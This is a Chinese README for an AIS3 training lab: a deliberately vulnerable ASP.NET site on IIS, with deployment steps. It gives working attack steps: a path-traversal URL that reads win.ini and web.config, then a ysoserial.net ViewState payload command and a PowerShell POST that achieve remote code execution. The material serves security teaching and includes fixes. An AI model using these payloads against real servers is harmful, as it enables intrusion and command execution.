# AIS3 IIS ASP.NET 反序列化 2 阶段 RCE 靶机

> **教学目的**：通过部署一个存在路径穿越 (LFI) 和 ViewState 反序列化漏洞的 ASP.NET 网站，教授学生如何发现和利用多阶段攻击链。

---

## 📋 项目概述

这是一个**真实渗透测试情境**的靶机：

### 表面层（正常网站）
- **FLUX 创意机构** 的专业官方网站
- 展示案例、团队、服务等正常内容
- 看起来完全是合法的商业网站

### 隐藏层（漏洞）
- **阶段 1**：路径穿越 (LFI) 漏洞 → 读取敏感文件 (web.config)
- **阶段 2**：ViewState 反序列化 RCE → 获得远程代码执行

### 教学价值
✅ 学生学会用**浏览器开发者工具**发现漏洞参数  
✅ 理解**多阶段攻击链**的实际流程  
✅ 认识**信息泄露导致 RCE** 的危险  
✅ 学习**.NET 序列化安全**的最佳实践  

---

## 🗂️ 文件结构

```
AIS3_IIS_ASP.NET_Deserialization2RCE/
├── README.md                          ← 本文件（项目说明）
├── IIS_DEPLOYMENT_GUIDE.md            ← 详细的 IIS 部署步骤
├── 现实攻击流程.md                     ← 完整的攻击说明（如何发现+利用）
├── PLAYWRIGHT_运行指南.md              ← 自动化测试说明
│
├── website/                            ← 网站文件夹（部署到 IIS）
│   ├── index.html                     ← FLUX 创意机构主页
│   ├── web.config                     ← ASP.NET 配置（包含 machineKey）
│   ├── download.aspx                  ← 路径穿越漏洞页面
│   └── report.aspx                    ← ViewState RCE 漏洞页面
│
├── test/                               ← 自动化测试文件夹
│   ├── package.json                   ← Node.js 依赖
│   └── website_test.js                ← Playwright 测试脚本
│
└── docs/                               ← 额外文档
    └── 痛苦.md                         ← 部署问题排查（可选参考）
```

---

## 🚀 快速开始（5 步部署）

### 前置需求
- **Windows Server 2016+** 或 **Windows 10/11 Pro/Enterprise**
- **IIS 10+**（已启用 ASP.NET 4.8）
- **Python 3.8+**（可选，用于查看 web.config 中的 machineKey）

### 步骤 1：启用 IIS 和 ASP.NET

在 Windows「控制面板」→「程序」→「程序和功能」→「启用或关闭 Windows 功能」中，勾选：

```
☑ Internet Information Services (IIS)
  ☑ Web Management Service
  ☑ World Wide Web Services
    ☑ Application Development Features
      ☑ ASP.NET 4.8
```

重启电脑。

### 步骤 2：克隆本仓库

```powershell
git clone https://github.com/zyyuy0u/AIS3_IIS_ASP.NET_Deserialization2RCE.git
cd AIS3_IIS_ASP.NET_Deserialization2RCE
```

### 步骤 3：复制网站文件到 IIS

创建应用文件夹：

```powershell
mkdir "C:\inetpub\wwwroot\VulnerableApp"
```

复制 `website/` 里的所有文件：

```powershell
Copy-Item "website\*" -Destination "C:\inetpub\wwwroot\VulnerableApp\" -Force
```

检查文件是否完整（**重要**：确保没有 `.txt` 后缀）：

```powershell
ls "C:\inetpub\wwwroot\VulnerableApp\"
```

输出应该是：
```
Mode                 Name
----                 ----
-a---          index.html
-a---          web.config
-a---          download.aspx
-a---          report.aspx
```

### 步骤 4：在 IIS 中创建网站

1. 打开 **IIS Manager**（`Win+R` → `inetmgr`）
2. 右键「Sites」→ 「Add Website」
3. 填入：
   - **Site name**: `VulnerableApp`
   - **Physical path**: `C:\inetpub\wwwroot\VulnerableApp`
   - **Host name**: `localhost`
   - **Port**: `8080`
4. 点「OK」

验证：在浏览器访问 `http://localhost:8080/`，看到 FLUX 创意机构网站 ✅

### 步骤 5：设置应用池权限

确保应用池有读文件权限（用于 LFI 攻击的演示）：

1. IIS Manager → 「Application Pools」
2. 右键「VulnerableApp」→ 「Advanced Settings」
3. 确保「Identity」是 `ApplicationPoolIdentity`

---

## 🎯 攻击流程（学生需要知道的）

### 【关键点】攻击者如何发现漏洞？

**不是**凭空知道有 `file=` 参数！而是通过以下步骤：

#### 步骤 0：侦察
1. 访问 `http://localhost:8080/`
2. 按 **F12** 打开开发者工具
3. 切换到 **Network** 标签
4. **刷新页面**，观察网络请求

**发现**：看到 `download.aspx?file=assets/case-*.jpg` 这样的请求 💡

#### 步骤 1：测试路径穿越（LFI）

```
http://localhost:8080/download.aspx?file=..\..\windows\win.ini
```

**结果**：✅ 看到 win.ini 内容！没有路径验证

#### 步骤 2：读取 web.config

```
http://localhost:8080/download.aspx?file=C:\inetpub\wwwroot\VulnerableApp\web.config
```

**获得**：machineKey 的 validationKey 和 decryptionKey ✅

#### 步骤 3：利用 ViewState RCE

使用 ysoserial.net 生成恶意 payload（需要提前安装）：

```powershell
# 准备密钥
$validationKey = "<从 web.config 复制>"
$decryptionKey = "<从 web.config 复制>"

# 生成 payload
.\ysoserial.net.exe `
  -p ViewState `
  -g TypeConfuseDelegate `
  --validationkey $validationKey `
  --validationalg HMACSHA256 `
  --decryptionkey $decryptionKey `
  --decryptionalg AES `
  --isencrypted `
  'cmd /c "whoami > C:\inetpub\wwwroot\VulnerableApp\pwned.txt"'
```

将 payload 发送到 report.aspx：

```powershell
$payload = "<粘贴上面生成的 payload>"

$body = @{
    "__VIEWSTATE" = $payload
    "__VIEWSTATEGENERATOR" = ""
    "txtReportName" = "test"
    "txtReportDate" = "2024-01-01"
}

Invoke-WebRequest `
    -Uri "http://localhost:8080/report.aspx" `
    -Method POST `
    -Body $body `
    -ErrorAction SilentlyContinue
```

#### 步骤 4：验证 RCE 成功

访问 `http://localhost:8080/pwned.txt`，看到命令输出 ✅

---

## 🧪 自动化测试（验证网站是否正常）

网站已配置 **Playwright 自动化测试**，可以验证所有功能。

### 运行测试

1. 进入 test 文件夹：

```powershell
cd test
npm install      # 首次需要安装依赖
```

2. 运行测试（需要网站在 `http://localhost:8080` 运行）：

```powershell
npm test         # 无头模式（快速）
npm run test:headed   # 有头模式（看着浏览器运行）
```

3. 查看测试报告：

```powershell
npm run show-report
```

测试包含：
- ✅ 页面加载验证
- ✅ 导航功能
- ✅ 案例卡片 Hover 效果
- ✅ 表单提交
- ✅ 隐藏漏洞页面可访问性
- ✅ 响应式设计

---

## 📖 详细文档

本仓库包含以下详细文档：

| 文档 | 内容 |
|---|---|
| **现实攻击流程.md** | ⭐ **最重要** — 完整的攻击步骤（如何从零发现漏洞到 RCE） |
| **IIS_DEPLOYMENT_GUIDE.md** | 详细的 IIS 配置和部署步骤（涵盖所有常见问题） |
| **PLAYWRIGHT_运行指南.md** | 自动化测试的完整说明 |
| **痛苦.md** | 部署过程中的 8 个问题和解决方案（参考） |

**建议阅读顺序**：
1. 本 README.md（了解项目）
2. IIS_DEPLOYMENT_GUIDE.md（按步骤部署）
3. 现实攻击流程.md（理解攻击）
4. PLAYWRIGHT_运行指南.md（验证功能）

---

## 🛡️ 漏洞说明

### 漏洞 1：路径穿越 (LFI)

**位置**：`download.aspx`

```csharp
string filePath = Request.QueryString["file"];
byte[] fileBytes = File.ReadAllBytes(filePath);  // ❌ 没有验证！
```

**后果**：任意文件读取

**防护方案**：
```csharp
// ✅ 正确做法
string basePath = Server.MapPath("~/assets/");
string filePath = Path.Combine(basePath, Request.QueryString["file"]);

// 验证路径在允许范围内
if (!Path.GetFullPath(filePath).StartsWith(Path.GetFullPath(basePath))) {
    throw new UnauthorizedAccessException();
}
```

### 漏洞 2：硬编 machineKey

**位置**：`web.config`

```xml
<machineKey validationKey="..." decryptionKey="..." />
```

**后果**：攻击者可伪造有效的 ViewState

**防护方案**：
- ✅ 使用 `IIS` 生成的自动 machineKey（不硬编）
- ✅ 定期轮换密钥
- ✅ 使用 Azure Key Vault 或密钥管理服务

### 漏洞 3：自动 ViewState 反序列化

ASP.NET 框架自动反序列化 `__VIEWSTATE`，如果签名和加密正确就会执行。

**防护方案**：
- ✅ 不要信任客户端数据（ViewState 虽然加密了，但如果密钥泄露就无用）
- ✅ 使用最新的 .NET Framework 版本
- ✅ 启用 `ViewStateUserKey` 来绑定用户身分

---

## 📊 学习路径

### 初级
- 理解 IIS 和 ASP.NET 的概念
- 学会部署网站
- 用浏览器开发者工具检查网络请求

### 中级
- 理解路径穿越 (LFI) 的原理
- 实践读取系统文件
- 理解 web.config 的作用

### 高级
- 理解 ASP.NET ViewState 的工作原理
- 学会使用 ysoserial.net 生成序列化 payload
- 实践多阶段攻击链

---

## 🔗 相关资源

- **ysoserial.net**：https://github.com/pwntester/ysoserial.net
- **ASP.NET ViewState 安全**：https://owasp.org/www-community/attacks/ViewState
- **路径穿越漏洞**：https://owasp.org/www-community/attacks/Path_Traversal
- **Playwright 自动化测试**：https://playwright.dev/

---

## 📝 你需要做什么？

### 如果你是**学生**（想学习攻击）：

1. ✅ 克隆本仓库
2. ✅ 按 IIS_DEPLOYMENT_GUIDE.md 部署网站
3. ✅ 阅读现实攻击流程.md 理解步骤
4. ✅ 打开浏览器开发者工具（F12）发现 `file=` 参数
5. ✅ 按照文档步骤进行攻击测试
6. ✅ 运行 Playwright 测试验证所有功能正常

### 如果你是**讲师**（想教学）：

1. ✅ 同上（先部署一遍确保理解）
2. ✅ 根据现实攻击流程.md 设计课程内容
3. ✅ 让学生从第 4 步开始（F12 发现漏洞）
4. ✅ 使用截图和测试报告作为教学材料
5. ✅ 可选：修改攻击命令或 web.config 中的 machineKey 增加难度

### 如果你是**安全研究员**（想审计）：

1. ✅ 阅读所有源代码（index.html、*.aspx、web.config）
2. ✅ 查看痛苦.md 中的已知问题
3. ✅ 在 Issues 中报告任何安全问题或改进建议

---

## ⚠️ 免责声明

本靶机**仅供教学和授权渗透测试使用**！

- ❌ 不得用于未授权的系统攻击
- ❌ 不得用于恶意目的
- ✅ 仅在你拥有或获得明确授权的系统上部署
- ✅ 学习和实验应在隔离的虚拟机环境中进行

---

## 📞 问题排查

### 问题：访问网站返回 404

```powershell
# 1. 检查 IIS 是否在运行
iisreset /status

# 2. 检查网站文件是否完整
ls "C:\inetpub\wwwroot\VulnerableApp\"

# 3. 重启 IIS
iisreset /restart
```

### 问题：LFI 测试失败

```powershell
# 确保应用池有足够权限读取文件
# IIS Manager → Application Pools → VulnerableApp → Advanced Settings
# 确保 Identity = ApplicationPoolIdentity
```

### 问题：RCE payload 不执行

```powershell
# 1. 检查 ysoserial.net 是否已正确安装
.\ysoserial.net.exe --help

# 2. 验证 machineKey 是否正确复制（无空格、大小写正确）
# 3. 验证 validation 和 decryption 算法是否与 web.config 匹配
```

详见 **IIS_DEPLOYMENT_GUIDE.md** 的常见问题部分。

---

## 📜 更新日志

- **2024-07-26** ✅ 初始版本
  - 完整的网站和漏洞代码
  - 详细的部署指南
  - Playwright 自动化测试
  - 真实的攻击流程文档

---

## 🎓 致谢

本项目设计用于 **AIS3** 网络安全夏令营，旨在帮助学生理解真实渗透测试的完整流程。

---

**祝学习愉快！** 🚀
